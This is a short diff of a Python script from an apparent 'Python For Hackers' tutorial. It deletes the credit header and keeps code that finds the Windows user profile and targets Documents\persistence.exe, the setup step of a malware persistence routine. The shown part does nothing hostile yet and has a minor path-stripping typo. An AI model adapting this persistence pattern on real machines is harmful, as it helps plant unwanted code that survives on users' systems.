@@ -1,11 +1,3 @@
-# Python For Hackers - Priyank Gada
-# www.youtube.com/priyankgada
-# Video tutorials available 
-# www.github.com/priyankgada 
-# Under testing Mode 
-
-
-
 import os
 import shutil
 import subprocess
@@ -18,7 +10,6 @@ import time
 path = os.getcwd().strip('/n')  
 Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
 destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'
-
 
 
 
